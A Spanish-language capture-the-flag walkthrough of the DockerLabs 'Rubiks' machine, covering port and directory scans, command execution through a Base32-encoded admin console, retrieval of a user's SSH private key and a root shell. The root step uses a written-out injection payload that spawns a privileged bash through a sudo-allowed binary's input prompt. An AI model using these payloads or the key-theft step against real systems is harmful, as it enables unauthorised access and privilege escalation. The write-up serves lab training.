## Introducción

Este documento presenta la resolución completa de la máquina **Rubiks**, desarrollada por *Luisillo_o* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web con una consola administrativa que permite ejecutar comandos codificados en Base32. Tras validar la ejecución remota de comandos, se enumera el sistema y se encuentra una clave privada SSH del usuario `luisillo`, permitiendo el acceso al sistema.
Una vez dentro, se identifica que el usuario puede ejecutar el binario `cube` como root. Este binario solicita entrada de usuario sin sanitización, permitiendo la inyección de comandos y la obtención de una shell con privilegios de `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Rubiks.zip
sudo bash auto_deploy.sh Rubiks.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Rubiks/{content,exploits,nmap,scripts}
cd Rubiks
```

---

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
extractPorts allPorts
```

El resultado muestra los siguientes servicios accesibles externamente:

* **22/tcp** — SSH
* **80/tcp** — HTTP

---

### 1.2 Enumeración de servicios

Se realiza un escaneo detallado de los servicios identificados:

```bash
nmap -sCV -p22,80 172.17.0.2
```

---

### 1.3 Enumeración web

Se identifica el dominio `rubikcube.dl`. Se agrega al `/etc/hosts`:

```bash
echo "172.17.0.2 rubikcube.dl" | sudo tee -a /etc/hosts
```

Se realiza un escaneo de directorios:

```bash
feroxbuster -u http://rubikcube.dl \
  -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
  -x php,html,txt,js -t 100 -C 404
```

**Rutas relevantes:**
- `/index.html` — Página principal.
- `/administration/myconsole.php` — Consola administrativa.

---

## Paso 2 — Explotación (Acceso inicial)

### 2.1 Consola codificada en Base32

La consola en `myconsole.php` requiere que los comandos se envíen codificados en Base32. Se prueba con `id`:

```bash
echo id | base32
```

Se envía el código y se confirma la ejecución remota de comandos.

### 2.2 Enumeración del sistema

Desde la consola, se listan archivos y se encuentra una clave privada SSH:

```
/home/luisillo/.ssh/id_rsa
```

### 2.3 Acceso SSH

Se descarga la clave, se ajustan permisos y se accede:

```bash
ssh -i id_rsa luisillo@172.17.0.2
```

---

## Paso 3 — Escalada de privilegios

### 3.1 De luisillo → root

Se verifican los permisos sudo:

```bash
sudo -l
```

Se puede ejecutar `/bin/cube` como root. El binario solicita entrada sin sanitización.

Se inyecta un comando:

```bash
sudo -u root /bin/cube
Digite el número: test[$(/bin/bash -p >&2)]
```
